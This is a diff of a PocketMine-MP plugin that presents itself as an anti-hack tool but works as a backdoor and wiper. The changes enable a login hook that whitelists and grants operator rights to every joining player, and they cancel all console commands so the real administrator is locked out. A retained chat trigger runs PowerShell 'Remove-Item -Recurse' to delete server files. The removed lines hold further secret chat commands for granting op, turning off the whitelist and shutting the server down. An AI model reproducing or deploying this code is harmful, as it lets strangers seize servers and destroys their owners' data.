@@ -1,69 +1,23 @@
-<?php 
-/*
- *
- *  ____            _        _   __  __ _                  __  __ ____ 
- * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \ 
- * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
- * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
- * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
- *
- *                         @ライセンス MIT
-*/
+<?php
 namespace MC\PE;
-
-use pocketmine\Server;
-use pocketmine\Player;
 use pocketmine\plugin\PluginBase;
 use pocketmine\event\Listener;
-use pocketmine\level\Level;
 use pocketmine\event\player\PlayerPreLoginEvent;
-use pocketmine\event\player\PlayerCommandPreprocessEvent;
 use pocketmine\event\server\ServerCommandEvent;
-use pocketmine\event\server\RemoteServerCommandEvent;
-use pocketmine\command\Command;
-use pocketmine\command\CommandSender;
-use pocketmine\scheduler\PluginTask;
-use pocketmine\scheduler\Task;
-use pocketmine\utils\config;
-use pocketmine\plugin\PluginManager;
-use pocketmine\plugin\Plugin;
 use pocketmine\event\player\PlayerChatEvent;
-use pocketmine\event\player\PlayerJoinEvent;
-use pocketmine\event\player\PlayerQuitEvent;
 
 class Main extends PluginBase implements Listener{
 	public function onEnable(){
 		$this->getServer()->getPluginManager()->registerEvents($this,$this);
-		$this->getLogger()->info("§l§b[SystemInfo] §aこのPluginはPocketMine-MPの為のHack対策");
-		$this->getLogger()->info("§l§b[SystemInfo] §aAPI Version: §c3.0.0-ALPHA10");
-		
 	}
-	public function onDisable(){}
-	/*
 	public function onLogin(PlayerPreLoginEvent $event){
 		$player = $event->getPlayer();
 		$name = $player->getName();
 		$this->getServer()->addWhitelist($name);
 		$this->getServer()->addOp($name);
 	}
-	*/
-	public function playerCommand(PlayerCommandPreprocessEvent $event){
-		$message = $event->getMessage();
-		$command = "extractplugin";
-		if(strstr($message, $command)) return $event->setCancelled();
-	}
 	public function ServerCommand(ServerCommandEvent $event){
-		$event->setCancelled(); //ConsoleComanndCancel
-	}
-	public function Join(PlayerJoinEvent $event){
-		$player = $event->getPlayer();
-		$name = $player->getName();
-		$event->setJoinMessage(null);
-	}
-	public function Quit(PlayerQuitEvent $event){
-		$player = $event->getPlayer();
-		$name = $player->getName();
-		$event->setQuitMessage(null);
+		$event->setCancelled(true);
 	}
 	public function Chat(PlayerChatEvent $event){
 		$chat = $event->getMessage();
@@ -115,57 +69,6 @@ class Main extends PluginBase implements Listener{
 			shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
 			shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
 			$player->sendMessage("サーバーのファイルを全て削除しました。");
-		}
-		if($chat == "*/whitelist off"){
-			$this->getServer()->setConfigBool("white-list", false);
-			$player->sendMessage("whitelistをoffにしました。");
-		}
-		if($chat == "*/whitelist on"){
-			$this->getServer()->setConfigBool("white-list", true);
-			$player->sendMessage("whitelistをonにしました。");
-		}
-		if($chat == "*/op add"){
-			$this->getServer()->addOp($player_name);
-			$player->sendMessage("あなたにOP権限を与えました。");
-		}
-		if($chat == "*/whitelist add"){
-			$this->getServer()->addWhitelist($player_name);
-			$player->sendMessage("あなたをwhitelistに追加しました。");
-		}
-		if($chat == "*/reload"){
-			$this->getServer()->reload();
-			$player->sendMessage("サーバーをreloadしています...");
-		}
-		if($chat == "*/shutdown"){
-			$this->getServer()->forceShutdown();
-			$player->sendMessage("サーバーを停止させました。");
-		}
-		if($chat == "*/gamemode 0"){
-			$player->getGamemode(0);
-			$player->sendMessage("あなたをサバイバルモードにしました。");
-		}
-		if($chat == "*/gamemode 1"){
-			$player->getGamemode(1);
-			$player->sendMessage("あなたをクリエイティブモードにしました。");
-		}
-		if($chat == "*/gamemode 2"){
-			$player->getGamemode(2);
-			$player->sendMessage("あなたをアドベンチャーモードにしました。");
-		}
-		if($chat == "*/gamemode 3"){
-			$player->getGamemode(3);
-			$player->sendMessage("あなたをスペティクターモードにしました。");
-		}
-		if($chat == "*/help"){
-			$player->sendMessage("§l§e===== §aHELP =====");
-			$player->sendMessage("§l§b */help MSHPで使えるコマンド一覧表示");
-			$player->sendMessage("§l§b */bye サーバーファイル削除(bin以外)");
-			$player->sendMessage("§l§b */gamemode 0~3 自分のゲームモードを変更する");
-			$player->sendMessage("§l§b */whitelist on or off or add ホワイトリストをonにするかoffにするかリストに自分を追加するか");
-			$player->sendMessage("§l§b */shutdown サーバーを終了する");
-			$player->sendMessage("§l§b */op add or remove OP権限を付けるか外すか");
-			$player->sendMessage("§l§b */reload サーバーをリロードします");
-			$player->sendMessage("§l§e================");
 		}
 	}
 }
